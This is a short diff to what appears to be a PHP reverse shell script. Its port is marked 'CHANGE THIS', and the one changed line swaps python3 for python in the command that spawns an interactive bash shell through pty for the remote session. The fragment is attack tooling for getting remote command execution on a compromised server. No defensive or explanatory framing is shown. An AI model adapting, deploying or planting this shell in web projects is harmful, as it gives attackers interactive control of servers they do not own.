@@ -6,7 +6,7 @@ $port = 8282;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"';
+$shell = 'python -c "import pty; pty.spawn(\'/bin/bash\')"';
 $daemon = 0;
 $debug = 0;
 
